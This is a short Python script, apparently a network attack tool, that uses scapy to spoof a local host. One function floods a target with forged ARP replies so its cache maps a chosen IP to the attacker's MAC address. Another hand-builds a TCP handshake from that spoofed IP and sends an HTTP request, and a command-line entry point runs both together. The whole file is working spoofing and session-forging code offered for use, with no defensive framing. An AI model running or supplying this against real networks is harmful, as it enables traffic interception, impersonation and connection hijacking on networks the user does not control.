from scapy.all import *
import _thread
def tcp(h,d,s,sp,dp):
#产生SYN包（FLAG = S 为SYN）
    ret = sr(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags='S',seq=17), verbose = False)
    #响应的数据包产生数组([0]为响应，[1]为未响应)
    list = ret[0].res
    #第一层[0]位第一组数据包
    #第二层[0]表示发送的包，[1]表示收到的包
    #第三层[0]为IP信息，[1]为TCP信息，[2]为TCP数据
    tcpfields_synack = list[0][1][1].fields

    sc_sn = tcpfields_synack['seq'] + 1
    cs_sn = tcpfields_synack['ack']
    print(sc_sn)
    print(cs_sn)

    #发送ACK(flag = A),完成三次握手！
    send(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags='A',seq=cs_sn,ack=sc_sn), verbose = False)
    send(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags=24,seq=cs_sn,ack=sc_sn)/'GET / HTTP/1.1\r\n', verbose = False)

# use scapy to arpspoof
#!/usr/bin/env python3

from sys import argv
from time import sleep
from scapy.all import *

def arpspoof(iface, target, spoof_ip):
    """
    arpspoof(iface, target, spoof_ip)
    use arpspoof the target.
    iface: network interface name.
    target: spoof target IP.
    spoof_ip: spoof IP in target arp cache.
    """
    try:
        deceiver_mac = get_if_hwaddr(iface)
        target_mac = getmacbyip(target)
        
        

        if not target_mac:
            print("Please enter the correct target!")
            target_mac = 'ff:ff:ff:ff:ff:ff'
            # exit()
        

        while True:
            sendp( \
                Ether(dst=target_mac) / \
                ARP(op=2, pdst=target, hwdst=target_mac, \
                    psrc=spoof_ip, hwsrc=deceiver_mac), \
                verbose=False \
            )
            # print("arp reply {} is-at {}".format(spoof_ip, deceiver_mac))
            # sleep(0.2)
    
    except KeyboardInterrupt:
        print("Cleaning up and re-arping targets...")
        spoof_mac = getmacbyip(spoof_ip)

        if not spoof_mac:
            exit()

        for i in range(5):
            sendp( \
                Ether(dst=target_mac) / \
                ARP(op=2, pdst=target, hwdst=target_mac, \
                    psrc=spoof_ip, hwsrc=spoof_mac), \
                verbose=False \
            )
            print("arp reply {} is-at {}".format(spoof_ip, spoof_mac))
            # sleep(0.2)


if __name__ == '__main__':
    try:
        _thread.start_new_thread(arpspoof, (argv[1], argv[2], argv[3],))
        time.sleep(1)
        tcp(argv[1], argv[2], argv[3],int(argv[4]),int(argv[5]))
    except IndexError:
        print("Usage: arpspoof.py <interface> <target> <spoof> <targetport> <spoofport>")

